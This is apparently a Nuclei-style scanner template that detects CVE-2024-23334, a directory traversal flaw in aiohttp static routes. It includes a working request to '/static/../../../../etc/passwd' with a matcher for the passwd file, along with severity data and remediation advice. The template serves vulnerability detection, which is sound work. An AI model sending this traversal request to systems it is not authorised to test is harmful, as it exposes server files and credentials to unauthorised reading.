http:
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - condition: and
    part: header
    type: word
    words:
    - aiohttp
    - application/octet-stream
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/static/../../../../etc/passwd'
id: CVE-2024-23334
info:
  author: DhiyaneshDk
  classification:
    cpe: cpe:2.3:a:aiohttp:aiohttp:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-23334
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
    epss-percentile: 0.99818
    epss-score: 0.93559
  description: 'aiohttp is an asynchronous HTTP client/server framework for asyncio
    and Python. When using aiohttp as a web server and configuring static routes,
    it is necessary to specify the root path for static files. Additionally, the option
    ''follow_symlinks'' can be used to determine whether to follow symbolic links
    outside the static root directory. When ''follow_symlinks'' is set to True, there
    is no validation to check if reading a file is within the root directory. This
    can lead to directory traversal vulnerabilities, resulting in unauthorized access
    to arbitrary files on the system, even when symlinks are not present. Disabling
    follow_symlinks and using a reverse proxy are encouraged mitigations. Version
    3.9.2 fixes this issue.

    '
  impact: 'Unauthenticated attackers can read arbitrary files on the server including
    sensitive configuration files with credentials and other sensitive data.

    '
  metadata:
    max-request: 1
    product: aiohttp
    vendor: aiohttp
  name: aiohttp - Directory Traversal
  reference:
  - https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ICUOCFGTB25WUT336BZ4UNYLSZOUVKBD/
  - https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XXWVZIVAYWEBHNRIILZVB3R3SDQNNAA7/
  - https://x.com/W01fh4cker/status/1762491210953060827?s=20
  remediation: 'Update aiohttp to version 3.9.2 or later, or disable follow_symlinks
    option.

    '
  severity: high
  tags: cve,cve2024,aiohttp,lfi,vkev,vuln
